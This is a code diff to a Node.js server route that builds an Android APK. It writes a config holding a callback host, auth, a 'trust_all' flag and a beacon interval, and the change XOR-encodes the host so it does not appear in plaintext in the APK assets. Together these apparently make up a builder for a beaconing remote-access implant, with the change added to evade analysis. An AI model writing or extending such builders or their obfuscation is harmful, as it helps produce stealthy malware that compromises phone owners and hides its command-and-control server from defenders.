@@ -174,6 +174,30 @@ function autoDetectHost(req) {
     return `${proto}://${host}`;
 }
 
+// XOR-encode the host URL so plaintext doesn't appear in config.json / APK assets
+function xorEncodeHost(str) {
+    return Buffer.from(str, "utf8").map(b => b ^ 0x42).toString("hex");
+}
+
+// Find Android SDK on common Ubuntu/Linux install paths
+function resolveAndroidHome() {
+    if (process.env.ANDROID_HOME)    return process.env.ANDROID_HOME;
+    if (process.env.ANDROID_SDK_ROOT) return process.env.ANDROID_SDK_ROOT;
+    const user = process.env.USER || process.env.LOGNAME || "ubuntu";
+    const candidates = [
+        "/root/android-sdk",
+        "/root/Android/Sdk",
+        "/opt/android-sdk",
+        "/usr/local/android-sdk",
+        `/home/${user}/Android/Sdk`,
+        `/home/${user}/android-sdk`,
+    ];
+    for (const p of candidates) {
+        if (fs.existsSync(p)) return p;
+    }
+    return null;
+}
+
 let buildRunning = false;
 
 router.post("/api/android/builder/build", requireAdmin, (req, res) => {
@@ -190,10 +214,16 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
     const trust_all = req.body.trust_all !== false;
     const beacon_ms = parseInt(req.body.beacon_ms) || 30000;
 
-    // Write updated config.json before build
+    // Write updated config.json before build — host is XOR-encoded so it doesn't
+    // appear as plaintext in the APK asset bundle
     try {
         if (!fs.existsSync(ASSETS_DIR)) fs.mkdirSync(ASSETS_DIR, { recursive: true });
-        const config = JSON.stringify({ host, auth, trust_all, beacon_interval_ms: beacon_ms }, null, 2);
+        const config = JSON.stringify({
+            host_xor: xorEncodeHost(host),
+            auth,
+            trust_all,
+            beacon_interval_ms: beacon_ms,
+        }, null, 2);
         fs.writeFileSync(path.join(ASSETS_DIR, "config.json"), config, "utf8");
     } catch (e) {
         res.status(500).json({ error: "Failed to write config: " + e.message });
@@ -209,7 +239,7 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
     const send = line => res.write(`data: ${line}\n\n`);
 
     send(`[INFO] Auto-detected host: ${host}`);
-    send(`[INFO] config.json written → ${JSON.stringify({ host, trust_all, beacon_interval_ms: beacon_ms })}`);
+    send(`[INFO] config.json written (host XOR-encoded) → ${JSON.stringify({ trust_all, beacon_interval_ms: beacon_ms })}`);
     send("[INFO] Starting Gradle build — this takes 1–3 minutes on first run...");
 
     buildRunning = true;
@@ -219,9 +249,15 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
         ? ["cmd.exe", ["/c", `"${GRADLEW}" assembleDebug`]]
         : [GRADLEW, ["assembleDebug"]];
 
+    const spawnEnv = { ...process.env, JAVA_OPTS: "-Xmx1g" };
+    if (!IS_WIN) {
+        const ah = resolveAndroidHome();
+        if (ah) { spawnEnv.ANDROID_HOME = ah; spawnEnv.ANDROID_SDK_ROOT = ah; }
+    }
+
     const proc = spawn(cmd, args, {
         cwd: PROJECT_DIR,
-        env: { ...process.env, JAVA_OPTS: "-Xmx1g" },
+        env: spawnEnv,
         shell: false,
     });
 
